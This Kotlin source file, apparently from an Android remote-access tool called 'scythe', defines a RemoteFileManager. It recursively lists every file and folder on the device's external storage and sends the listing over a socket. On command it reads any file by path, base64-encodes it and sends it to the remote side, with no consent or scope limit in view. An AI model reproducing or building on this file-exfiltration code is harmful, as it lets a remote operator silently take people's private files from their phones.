package com.musa_kavak.scythe.socket_io

import android.content.Context
import android.os.Environment
import android.util.Base64
import com.musa_kavak.scythe.models.file.RemoteFile
import java.io.File

class RemoteFileManager(private val context: Context) {

    fun sendInternalStorage() {
        SocketEmitter(context).AndroidInternalStorageResponse(getNameListOfFiles())
    }

    fun sendFile(path: String) {
        val file = File(path)
        if (file.isFile) {
            val base64String = Base64.encodeToString(file.readBytes(), Base64.DEFAULT)
            SocketEmitter(context).AndroidFileResponse(base64String)
        }
    }

    private fun getNameListOfFiles(): RemoteFile {
        val storage = Environment.getExternalStorageDirectory()
        return RemoteFile(storage.path, storage.name, true, null, getSubFiles(storage))
    }

    private fun getSubFiles(file: File): List<RemoteFile>? {
        val subFileList = mutableListOf<RemoteFile>()
        var x = File("/storage/emulated/0/Music")

        file.listFiles()?.forEach {
            if (it.isFile) {
                it.path
                it.absolutePath
                subFileList.add(
                    RemoteFile(
                        it.path, it.name, false, it.extension
                    )
                )
            }
            if (it.isDirectory) {
                subFileList.add(
                    RemoteFile(
                        it.path, it.name, true, null, getSubFiles(it)
                    )
                )
            }
        }
        if (subFileList.isEmpty()) return null
        return subFileList
    }

}